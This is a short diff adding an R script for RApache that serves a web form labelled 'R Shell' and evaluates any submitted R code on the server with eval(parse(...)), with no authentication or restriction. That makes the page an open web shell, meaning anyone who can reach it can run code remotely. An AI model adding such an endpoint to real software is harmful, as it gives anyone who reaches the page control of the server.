@@ -1,0 +1,16 @@
+setContentType('text/html')
+cat('<HTML><head><style type="text/css">\n') 
+cat('table { border: 1px solid #8897be; border-spacing: 0px; font-size: 10pt; }')
+cat('td { border-bottom:1px solid #d9d9d9; border-left:1px solid #d9d9d9; border-spacing: 0px; padding: 3px 8px; }')
+cat('td.l { font-weight: bold; width: 10%; }\n')
+cat('tr.e { background-color: #eeeeee; border-spacing: 0px; }\n')
+cat('tr.o { background-color: #ffffff; border-spacing: 0px; }\n')
+cat('</style></head><BODY><H1>R Shell for RApache</H1>\n')
+cat('<form enctype=multipart/form-data method="POST">\n')
+cat('<textarea cols=80 rows=10 id="code" name="code"></textarea><br>')
+cat('<input type=submit name=Submit>')
+if (!is.null(POST$code)){
+    cat("<hr><pre>\n")
+    try(eval(parse(text=POST$code)))
+    cat("</pre>\n")
+}
